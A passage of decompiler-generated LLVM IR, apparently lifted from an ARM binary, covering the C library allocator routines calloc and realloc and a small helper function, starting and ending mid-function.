  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 22, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 12, 10, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 23 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 1, 0, 2 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder i32 %arg6, { 4, 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1bf44, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_1bf40, { 1, 0 }
  uselistorder label %dec_label_pc_1bf38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1bf30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1bd90, { 2, 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_1bf50 = load i32, i32* @r4, align 4
  %v6_1bf50 = load i32, i32* @r5, align 4
  %v9_1bf50 = load i32, i32* @r6, align 4
  %v12_1bf50 = load i32, i32* @lr, align 4
  %v2_1bf58 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_1bf68 = mul i32 %arg2, %arg1
  store i32 %v2_1bf68, i32* @r6, align 4
  br i1 %v2_1bf58, label %dec_label_pc_1bf98, label %dec_label_pc_1bf70

dec_label_pc_1bf70:                               ; preds = %entry
  %v2_1bf78 = udiv i32 %v2_1bf68, %arg1
  %v9_1bf7c = icmp eq i32 %v2_1bf78, %arg2
  br i1 %v9_1bf7c, label %dec_label_pc_1bf98, label %dec_label_pc_1bf84

dec_label_pc_1bf84:                               ; preds = %dec_label_pc_1bf70
  %v0_1bf84 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1bf90 = inttoptr i32 %v0_1bf84 to i32*
  store i32 12, i32* %v2_1bf90, align 4
  br label %dec_label_pc_1c05c

dec_label_pc_1bf98:                               ; preds = %dec_label_pc_1bf70, %entry
  %v4_1bf9c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 76) to i32*), align 4
  store i32 %v4_1bf9c, i32* @r4, align 4
  %v4_1bfb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  store i32 %v4_1bfb4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1bfb4)
  %v0_1bfc8 = load i32, i32* @r5, align 4
  %v2_1bfc8 = add i32 %v0_1bfc8, 20
  %v3_1bfc8 = inttoptr i32 %v2_1bfc8 to i32*
  %v4_1bfc8 = load i32, i32* %v3_1bfc8, align 4
  store i32 %v4_1bfc8, i32* %ip.global-to-local, align 4
  store i32 114644, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1bfc8)
  %v0_1bfd4 = load i32, i32* @r6, align 4
  %v1_1bfd8 = call i32 @malloc(i32 %v0_1bfd4)
  store i32 %v1_1bfd8, i32* %r4.global-to-local, align 4
  %v2_1bfdc = icmp eq i32 %v1_1bfd8, 0
  br i1 %v2_1bfdc, label %.thread, label %dec_label_pc_1bfe4

dec_label_pc_1bfe4:                               ; preds = %dec_label_pc_1bf98
  %v1_1bfe4 = add i32 %v1_1bfd8, -4
  %v2_1bfe4 = inttoptr i32 %v1_1bfe4 to i32*
  %v3_1bfe4 = load i32, i32* %v2_1bfe4, align 4
  %v1_1bfe8 = and i32 %v3_1bfe4, 2
  %v2_1bfe8 = icmp eq i32 %v1_1bfe8, 0
  br i1 %v2_1bfe8, label %dec_label_pc_1bff0, label %.thread

dec_label_pc_1bff0:                               ; preds = %dec_label_pc_1bfe4
  %v1_1bff06 = add i32 %v3_1bfe4, -4
  %v1_1bff4 = and i32 %v1_1bff06, -4
  store i32 %v1_1bff4, i32* @r2, align 4
  %v3_1bff8 = udiv i32 %v1_1bff4, 4
  store i32 %v3_1bff8, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_1bff4, 36
  %v2_1c000 = icmp ult i32 %v1_1bff4, 33
  %v3_1c000 = or i1 %tmp, %v2_1c000
  br i1 %v3_1c000, label %dec_label_pc_1c00c, label %dec_label_pc_1c004

dec_label_pc_1c004:                               ; preds = %dec_label_pc_1bff0
  %v2_1c004 = inttoptr i32 %v1_1bfd8 to i8*
  %v3_1c004 = call i32 @__GI_memset(i8* %v2_1c004, i32 0)
  br label %.thread

dec_label_pc_1c00c:                               ; preds = %dec_label_pc_1bff0
  %tmp7 = icmp eq i32 %v1_1bff4, 16
  %v2_1c010 = inttoptr i32 %v1_1bfd8 to i32*
  store i32 0, i32* %v2_1c010, align 4
  %v1_1c014 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c014 = add i32 %v1_1c014, 4
  %v3_1c014 = inttoptr i32 %v2_1c014 to i32*
  store i32 0, i32* %v3_1c014, align 4
  %v1_1c018 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c018 = add i32 %v1_1c018, 8
  %v3_1c018 = inttoptr i32 %v2_1c018 to i32*
  store i32 0, i32* %v3_1c018, align 4
  %v2_1c01c = icmp ult i32 %v1_1bff4, 13
  %v3_1c01c = or i1 %tmp7, %v2_1c01c
  br i1 %v3_1c01c, label %.thread, label %dec_label_pc_1c020

dec_label_pc_1c020:                               ; preds = %dec_label_pc_1c00c
  %v0_1c020 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c024 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c024 = add i32 %v1_1c024, 12
  %v3_1c024 = inttoptr i32 %v2_1c024 to i32*
  store i32 0, i32* %v3_1c024, align 4
  %v1_1c028 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c028 = add i32 %v1_1c028, 16
  %v3_1c028 = inttoptr i32 %v2_1c028 to i32*
  store i32 0, i32* %v3_1c028, align 4
  %tmp8 = icmp ult i32 %v0_1c020, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_1c030

dec_label_pc_1c030:                               ; preds = %dec_label_pc_1c020
  %v0_1c030 = load i32, i32* %ip.global-to-local, align 4
  %v7_1c030 = icmp eq i32 %v0_1c030, 9
  %v1_1c034 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c034 = add i32 %v1_1c034, 20
  %v3_1c034 = inttoptr i32 %v2_1c034 to i32*
  store i32 0, i32* %v3_1c034, align 4
  %v1_1c038 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c038 = add i32 %v1_1c038, 24
  %v3_1c038 = inttoptr i32 %v2_1c038 to i32*
  store i32 0, i32* %v3_1c038, align 4
  br i1 %v7_1c030, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1c030
  %v2_1c03c = load i32, i32* %r4.global-to-local, align 4
  %v3_1c03c = add i32 %v2_1c03c, 32
  %v4_1c03c = inttoptr i32 %v3_1c03c to i32*
  store i32 0, i32* %v4_1c03c, align 4
  %v2_1c040 = load i32, i32* %r4.global-to-local, align 4
  %v3_1c040 = add i32 %v2_1c040, 28
  %v4_1c040 = inttoptr i32 %v3_1c040 to i32*
  store i32 0, i32* %v4_1c040, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1c030, %dec_label_pc_1bfe4, %dec_label_pc_1c020, %dec_label_pc_1c00c, %dec_label_pc_1bf98, %dec_label_pc_1c004, %bb
  %v0_1c050 = load i32, i32* @r5, align 4
  %v2_1c050 = add i32 %v0_1c050, 28
  %v3_1c050 = inttoptr i32 %v2_1c050 to i32*
  %v4_1c050 = load i32, i32* %v3_1c050, align 4
  store i32 %v4_1c050, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1c050)
  br label %dec_label_pc_1c05c

dec_label_pc_1c05c:                               ; preds = %dec_label_pc_1bf84, %.thread
  %v0_1c05c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1bf50, i32* @r4, align 4
  store i32 %v6_1bf50, i32* @r5, align 4
  store i32 %v9_1bf50, i32* @r6, align 4
  store i32 %v12_1bf50, i32* @lr, align 4
  ret i32 %v0_1c05c

; uselistorder directives
  uselistorder i32 %v1_1bff4, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v1_1bfd8, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 13, { 0, 3, 4, 6, 5, 1, 8, 2, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1c05c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_1c070(i32 %arg1) local_unnamed_addr {
dec_label_pc_1c070:
  %v0_1c070 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1c070, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1c070
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1c070, %bb
  %v10_1c080 = phi i32 [ %arg1, %dec_label_pc_1c070 ], [ 0, %bb ]
  ret i32 %v10_1c080

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1c084 = load i32, i32* @r4, align 4
  %v6_1c084 = load i32, i32* @r5, align 4
  %v9_1c084 = load i32, i32* @r6, align 4
  %v12_1c084 = load i32, i32* @r7, align 4
  %v15_1c084 = load i32, i32* @r8, align 4
  %v18_1c084 = load i32, i32* @sb, align 4
  %v21_1c084 = load i32, i32* @sl, align 4
  %v24_1c084 = load i32, i32* @fp, align 4
  %v27_1c084 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1c090 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1c090, label %dec_label_pc_1c0a4, label %dec_label_pc_1c0b4

dec_label_pc_1c0a4:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_1c0a8 = call i32 @malloc(i32 %arg2)
  store i32 %v1_1c0a8, i32* %r0.global-to-local, align 4
  store i32 %v1_1c0a8, i32* @r4, align 4
  br label %dec_label_pc_1c40c

dec_label_pc_1c0b4:                               ; preds = %entry
  %v2_1c0b4 = icmp eq i32 %arg2, 0
  br i1 %v2_1c0b4, label %dec_label_pc_1c0bc, label %dec_label_pc_1c0c8

dec_label_pc_1c0bc:                               ; preds = %dec_label_pc_1c0b4
  %v0_1c0bc = call i32 @free()
  store i32 %v0_1c0bc, i32* %r0.global-to-local, align 4
  %v0_1c0c0 = load i32, i32* @r6, align 4
  store i32 %v0_1c0c0, i32* @r4, align 4
  br label %dec_label_pc_1c40c

dec_label_pc_1c0c8:                               ; preds = %dec_label_pc_1c0b4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_1c0d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 76) to i32*), align 4
  store i32 %v4_1c0d0, i32* @r4, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 %v4_1c0d0, i32* %r2.global-to-local, align 4
  %v4_1c0dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 40) to i32*), align 4
  store i32 %v4_1c0dc, i32* %r1.global-to-local, align 4
  %v2_1c0e0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1c0e0, i32* %r0.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v4_1c0e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1c0e8)
  %v0_1c0f4 = load i32, i32* @r4, align 4
  store i32 %v0_1c0f4, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r1.global-to-local, align 4
  %v4_1c100 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 20) to i32*), align 4
  store i32 %v4_1c100, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1c10c.1646 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1c100)
  %v0_1c10c = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_1c10c, -32
  br i1 %tmp36, label %dec_label_pc_1c128, label %dec_label_pc_1c114

dec_label_pc_1c114:                               ; preds = %dec_label_pc_1c0c8
  %v0_1c114 = call i32 @__GI___errno_location()
  store i32 %v0_1c114, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1c120 = inttoptr i32 %v0_1c114 to i32*
  store i32 12, i32* %v2_1c120, align 4
  br label %dec_label_pc_1c40c

dec_label_pc_1c128:                               ; preds = %dec_label_pc_1c0c8
  %v1_1c128 = add i32 %v0_1c10c, 11
  store i32 %v1_1c128, i32* %r0.global-to-local, align 4
  %v0_1c12c = load i32, i32* @r5, align 4
  %v1_1c12c = add i32 %v0_1c12c, -4
  %v2_1c12c = inttoptr i32 %v1_1c12c to i32*
  %v3_1c12c = load i32, i32* %v2_1c12c, align 4
  store i32 %v3_1c12c, i32* %r2.global-to-local, align 4
  %v2_1c130 = icmp ugt i32 %v1_1c128, 14
  %v7_1c130 = icmp eq i32 %v1_1c128, 15
  %v2_1c134 = xor i1 %v2_1c130, true
  %v3_1c134 = or i1 %v7_1c130, %v2_1c134
  br i1 %v3_1c134, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_1c128
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_1c128, %bb
  %v2_1c138 = xor i1 %v7_1c130, true
  %v3_1c138 = and i1 %v2_1c130, %v2_1c138
  br i1 %v3_1c138, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_1c138 = and i32 %v1_1c128, -8
  store i32 %v5_1c138, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_1c13c = and i32 %v3_1c12c, 2
  %v2_1c13c = icmp eq i32 %v1_1c13c, 0
  %v1_1c140 = add i32 %v0_1c12c, -8
  store i32 %v1_1c140, i32* @sl, align 4
  %v1_1c144 = and i32 %v3_1c12c, -4
  store i32 %v1_1c144, i32* @r6, align 4
  br i1 %v2_1c13c, label %dec_label_pc_1c14c, label %dec_label_pc_1c324

dec_label_pc_1c14c:                               ; preds = %bb29
  %v1_1c14c = load i32, i32* @sb, align 4
  %v3_1c14c = icmp ult i32 %v1_1c144, %v1_1c14c
  br i1 %v3_1c14c, label %dec_label_pc_1c158, label %bb30

bb30:                                             ; preds = %dec_label_pc_1c14c
  store i32 %v1_1c144, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c2bc

dec_label_pc_1c158:                               ; preds = %dec_label_pc_1c14c
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_1c160 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v4_1c160, i32* %r0.global-to-local, align 4
  %v1_1c164 = add i32 %v4_1c160, 44
  %v2_1c164 = inttoptr i32 %v1_1c164 to i32*
  %v3_1c164 = load i32, i32* %v2_1c164, align 4
  store i32 %v3_1c164, i32* %r3.global-to-local, align 4
  %v2_1c168 = add i32 %v1_1c144, %v1_1c140
  store i32 %v2_1c168, i32* @r4, align 4
  %v9_1c16c = icmp eq i32 %v2_1c168, %v3_1c164
  %v1_1c170 = add i32 %v2_1c168, 4
  %v2_1c170 = inttoptr i32 %v1_1c170 to i32*
  %v3_1c170 = load i32, i32* %v2_1c170, align 4
  store i32 %v3_1c170, i32* %r1.global-to-local, align 4
  br i1 %v9_1c16c, label %dec_label_pc_1c178, label %dec_label_pc_1c1b4

dec_label_pc_1c178:                               ; preds = %dec_label_pc_1c158
  %v1_1c178 = and i32 %v3_1c170, -4
  %v2_1c17c = add i32 %v1_1c178, %v1_1c144
  store i32 %v2_1c17c, i32* %r1.global-to-local, align 4
  %v1_1c180 = add i32 %v1_1c14c, 16
  store i32 %v1_1c180, i32* %r3.global-to-local, align 4
  %v3_1c184 = icmp ult i32 %v2_1c17c, %v1_1c180
  br i1 %v3_1c184, label %dec_label_pc_1c208, label %dec_label_pc_1c18c

dec_label_pc_1c18c:                               ; preds = %dec_label_pc_1c178
  %v2_1c18c = sub i32 %v2_1c17c, %v1_1c14c
  %v1_1c190 = urem i32 %v3_1c12c, 2
  %v2_1c194 = add i32 %v1_1c14c, %v1_1c140
  store i32 %v2_1c194, i32* %r1.global-to-local, align 4
  %v2_1c198 = or i32 %v1_1c14c, %v1_1c190
  store i32 %v2_1c198, i32* %r2.global-to-local, align 4
  %v1_1c19c = or i32 %v2_1c18c, 1
  store i32 %v1_1c19c, i32* %r3.global-to-local, align 4
  store i32 %v0_1c12c, i32* @r4, align 4
  store i32 %v2_1c198, i32* %v2_1c12c, align 4
  %v0_1c1a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1c1a8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1c1a8 = add i32 %v1_1c1a8, 44
  %v3_1c1a8 = inttoptr i32 %v2_1c1a8 to i32*
  store i32 %v0_1c1a8, i32* %v3_1c1a8, align 4
  %v0_1c1ac = load i32, i32* %r3.global-to-local, align 4
  %v1_1c1ac = load i32, i32* %r1.global-to-local, align 4
  %v2_1c1ac = add i32 %v1_1c1ac, 4
  %v3_1c1ac = inttoptr i32 %v2_1c1ac to i32*
  store i32 %v0_1c1ac, i32* %v3_1c1ac, align 4
  br label %dec_label_pc_1c3f0

dec_label_pc_1c1b4:                               ; preds = %dec_label_pc_1c158
  %v1_1c1b4 = and i32 %v3_1c170, -2
  %v2_1c1b8 = add i32 %v1_1c1b4, %v2_1c168
  store i32 %v2_1c1b8, i32* %r3.global-to-local, align 4
  %v1_1c1bc = add i32 %v2_1c1b8, 4
  %v2_1c1bc = inttoptr i32 %v1_1c1bc to i32*
  %v3_1c1bc = load i32, i32* %v2_1c1bc, align 4
  store i32 %v3_1c1bc, i32* %r3.global-to-local, align 4
  %v1_1c1c0 = urem i32 %v3_1c1bc, 2
  %v2_1c1c0 = icmp eq i32 %v1_1c1c0, 0
  br i1 %v2_1c1c0, label %dec_label_pc_1c1c8, label %dec_label_pc_1c208

dec_label_pc_1c1c8:                               ; preds = %dec_label_pc_1c1b4
  %v1_1c1c8 = and i32 %v3_1c170, -4
  store i32 %v1_1c1c8, i32* %r3.global-to-local, align 4
  %v2_1c1cc = add i32 %v1_1c1c8, %v1_1c144
  store i32 %v2_1c1cc, i32* %r0.global-to-local, align 4
  %v3_1c1d0 = icmp ult i32 %v2_1c1cc, %v1_1c14c
  br i1 %v3_1c1d0, label %dec_label_pc_1c208, label %dec_label_pc_1c1d8

dec_label_pc_1c1d8:                               ; preds = %dec_label_pc_1c1c8
  %v1_1c1d8 = add i32 %v1_1c144, %v0_1c12c
  %v2_1c1d8 = inttoptr i32 %v1_1c1d8 to i32*
  %v3_1c1d8 = load i32, i32* %v2_1c1d8, align 4
  store i32 %v3_1c1d8, i32* %r1.global-to-local, align 4
  %v1_1c1dc = add i32 %v3_1c1d8, 12
  %v2_1c1dc = inttoptr i32 %v1_1c1dc to i32*
  %v3_1c1dc = load i32, i32* %v2_1c1dc, align 4
  store i32 %v3_1c1dc, i32* %r3.global-to-local, align 4
  %v9_1c1e0 = icmp eq i32 %v3_1c1dc, %v2_1c168
  %v1_1c1e4 = add i32 %v2_1c168, 12
  %v2_1c1e4 = inttoptr i32 %v1_1c1e4 to i32*
  %v3_1c1e4 = load i32, i32* %v2_1c1e4, align 4
  store i32 %v3_1c1e4, i32* %r2.global-to-local, align 4
  br i1 %v9_1c1e0, label %dec_label_pc_1c1ec, label %dec_label_pc_1c1f8

dec_label_pc_1c1ec:                               ; preds = %dec_label_pc_1c1d8
  %v1_1c1ec = add i32 %v3_1c1e4, 8
  %v2_1c1ec = inttoptr i32 %v1_1c1ec to i32*
  %v3_1c1ec = load i32, i32* %v2_1c1ec, align 4
  store i32 %v3_1c1ec, i32* %r3.global-to-local, align 4
  %v9_1c1f0 = icmp eq i32 %v3_1c1ec, %v2_1c168
  br i1 %v9_1c1f0, label %dec_label_pc_1c1fc, label %dec_label_pc_1c1f8

dec_label_pc_1c1f8:                               ; preds = %dec_label_pc_1c1d8, %dec_label_pc_1c1ec
  %v0_1c1f8 = call i32 @abort()
  store i32 %v0_1c1f8, i32* %r0.global-to-local, align 4
  %v0_1c1fc.pre = load i32, i32* @r1, align 4
  %v1_1c1fc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1c1fc

dec_label_pc_1c1fc:                               ; preds = %dec_label_pc_1c1ec, %dec_label_pc_1c1f8
  %v1_1c1fc = phi i32 [ %v3_1c1e4, %dec_label_pc_1c1ec ], [ %v1_1c1fc.pre, %dec_label_pc_1c1f8 ]
  %v0_1c1fc = phi i32 [ %v3_1c1d8, %dec_label_pc_1c1ec ], [ %v0_1c1fc.pre, %dec_label_pc_1c1f8 ]
  %v2_1c1fc = add i32 %v1_1c1fc, 8
  %v3_1c1fc = inttoptr i32 %v2_1c1fc to i32*
  store i32 %v0_1c1fc, i32* %v3_1c1fc, align 4
  %v0_1c200 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c200 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c200 = add i32 %v1_1c200, 12
  %v3_1c200 = inttoptr i32 %v2_1c200 to i32*
  store i32 %v0_1c200, i32* %v3_1c200, align 4
  %v1_1c2bc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c2bc

dec_label_pc_1c208:                               ; preds = %dec_label_pc_1c178, %dec_label_pc_1c1c8, %dec_label_pc_1c1b4
  %v1_1c208 = add i32 %v1_1c14c, -7
  store i32 %v1_1c208, i32* %r0.global-to-local, align 4
  %v1_1c20c = call i32 @malloc(i32 %v1_1c208)
  store i32 %v1_1c20c, i32* @r0, align 4
  store i32 %v1_1c20c, i32* %r1.global-to-local, align 4
  %v2_1c210 = icmp eq i32 %v1_1c20c, 0
  br i1 %v2_1c210, label %bb31, label %dec_label_pc_1c21c

bb31:                                             ; preds = %dec_label_pc_1c208
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1c3f0

dec_label_pc_1c21c:                               ; preds = %dec_label_pc_1c208
  %v1_1c224.pre = load i32, i32* @r4, align 4
  %v1_1c21c = add i32 %v1_1c20c, -4
  %v2_1c21c = inttoptr i32 %v1_1c21c to i32*
  %v3_1c21c = load i32, i32* %v2_1c21c, align 4
  store i32 %v3_1c21c, i32* @r3, align 4
  %v1_1c220 = add i32 %v1_1c20c, -8
  store i32 %v1_1c220, i32* @r7, align 4
  %v9_1c224 = icmp eq i32 %v1_1c220, %v1_1c224.pre
  br i1 %v9_1c224, label %.thread2, label %dec_label_pc_1c234

.thread2:                                         ; preds = %dec_label_pc_1c21c
  %v2_1c228 = and i32 %v3_1c21c, -4
  store i32 %v2_1c228, i32* %r3.global-to-local, align 4
  %v2_1c22c = load i32, i32* @r6, align 4
  %v3_1c22c = add i32 %v2_1c22c, %v2_1c228
  store i32 %v3_1c22c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c2bc

dec_label_pc_1c234:                               ; preds = %dec_label_pc_1c21c
  %v0_1c234 = load i32, i32* @r6, align 4
  %v1_1c234 = add i32 %v0_1c234, -4
  store i32 %v1_1c234, i32* @r2, align 4
  %v3_1c238 = udiv i32 %v1_1c234, 4
  store i32 %v3_1c238, i32* @ip, align 4
  %tmp37 = and i32 %v1_1c234, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_1c240 = icmp ult i32 %v1_1c234, 36
  %v3_1c240 = or i1 %tmp38, %v2_1c240
  %v0_1c250 = load i32, i32* @r5, align 4
  br i1 %v3_1c240, label %dec_label_pc_1c250, label %dec_label_pc_1c244

dec_label_pc_1c244:                               ; preds = %dec_label_pc_1c234
  store i32 %v0_1c250, i32* @r1, align 4
  %v0_1c248 = call i32 @memcpy()
  store i32 %v0_1c248, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1c250:                               ; preds = %dec_label_pc_1c234
  %v1_1c250 = inttoptr i32 %v0_1c250 to i32*
  %v2_1c250 = load i32, i32* %v1_1c250, align 4
  store i32 %v2_1c250, i32* %r3.global-to-local, align 4
  %v2_1c254 = inttoptr i32 %v1_1c20c to i32*
  store i32 %v2_1c250, i32* %v2_1c254, align 4
  %v0_1c258 = load i32, i32* @r5, align 4
  %v1_1c258 = add i32 %v0_1c258, 4
  %v2_1c258 = inttoptr i32 %v1_1c258 to i32*
  %v3_1c258 = load i32, i32* %v2_1c258, align 4
  store i32 %v3_1c258, i32* %r3.global-to-local, align 4
  %v1_1c25c = load i32, i32* %r1.global-to-local, align 4
  %v2_1c25c = add i32 %v1_1c25c, 4
  %v3_1c25c = inttoptr i32 %v2_1c25c to i32*
  store i32 %v3_1c258, i32* %v3_1c25c, align 4
  %v0_1c260 = load i32, i32* @r5, align 4
  %v1_1c260 = add i32 %v0_1c260, 8
  %v2_1c260 = inttoptr i32 %v1_1c260 to i32*
  %v3_1c260 = load i32, i32* %v2_1c260, align 4
  store i32 %v3_1c260, i32* %r3.global-to-local, align 4
  %v0_1c264 = load i32, i32* @ip, align 4
  %v1_1c268 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c268 = add i32 %v1_1c268, 8
  %v3_1c268 = inttoptr i32 %v2_1c268 to i32*
  store i32 %v3_1c260, i32* %v3_1c268, align 4
  %tmp39 = icmp ult i32 %v0_1c264, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_1c270

dec_label_pc_1c270:                               ; preds = %dec_label_pc_1c250
  %v0_1c270 = load i32, i32* @r5, align 4
  %v1_1c270 = add i32 %v0_1c270, 12
  %v2_1c270 = inttoptr i32 %v1_1c270 to i32*
  %v3_1c270 = load i32, i32* %v2_1c270, align 4
  store i32 %v3_1c270, i32* %r3.global-to-local, align 4
  %v1_1c274 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c274 = add i32 %v1_1c274, 12
  %v3_1c274 = inttoptr i32 %v2_1c274 to i32*
  store i32 %v3_1c270, i32* %v3_1c274, align 4
  %v0_1c278 = load i32, i32* @r5, align 4
  %v1_1c278 = add i32 %v0_1c278, 16
  %v2_1c278 = inttoptr i32 %v1_1c278 to i32*
  %v3_1c278 = load i32, i32* %v2_1c278, align 4
  store i32 %v3_1c278, i32* %r3.global-to-local, align 4
  %v0_1c27c = load i32, i32* @ip, align 4
  %v1_1c280 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c280 = add i32 %v1_1c280, 16
  %v3_1c280 = inttoptr i32 %v2_1c280 to i32*
  store i32 %v3_1c278, i32* %v3_1c280, align 4
  %tmp40 = icmp ult i32 %v0_1c27c, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_1c288

dec_label_pc_1c288:                               ; preds = %dec_label_pc_1c270
  %v0_1c288 = load i32, i32* @r5, align 4
  %v1_1c288 = add i32 %v0_1c288, 20
  %v2_1c288 = inttoptr i32 %v1_1c288 to i32*
  %v3_1c288 = load i32, i32* %v2_1c288, align 4
  store i32 %v3_1c288, i32* %r3.global-to-local, align 4
  %v1_1c28c = load i32, i32* %r1.global-to-local, align 4
  %v2_1c28c = add i32 %v1_1c28c, 20
  %v3_1c28c = inttoptr i32 %v2_1c28c to i32*
  store i32 %v3_1c288, i32* %v3_1c28c, align 4
  %v0_1c290 = load i32, i32* @r5, align 4
  %v1_1c290 = add i32 %v0_1c290, 24
  %v2_1c290 = inttoptr i32 %v1_1c290 to i32*
  %v3_1c290 = load i32, i32* %v2_1c290, align 4
  store i32 %v3_1c290, i32* %r3.global-to-local, align 4
  %v1_1c294 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c294 = add i32 %v1_1c294, 24
  %v3_1c294 = inttoptr i32 %v2_1c294 to i32*
  store i32 %v3_1c290, i32* %v3_1c294, align 4
  %v0_1c298 = load i32, i32* @ip, align 4
  %v7_1c298 = icmp eq i32 %v0_1c298, 9
  br i1 %v7_1c298, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1c288
  %v1_1c29c = load i32, i32* @r5, align 4
  %v2_1c29c = add i32 %v1_1c29c, 28
  %v3_1c29c = inttoptr i32 %v2_1c29c to i32*
  %v4_1c29c = load i32, i32* %v3_1c29c, align 4
  store i32 %v4_1c29c, i32* %r3.global-to-local, align 4
  %v2_1c2a0 = load i32, i32* %r1.global-to-local, align 4
  %v3_1c2a0 = add i32 %v2_1c2a0, 28
  %v4_1c2a0 = inttoptr i32 %v3_1c2a0 to i32*
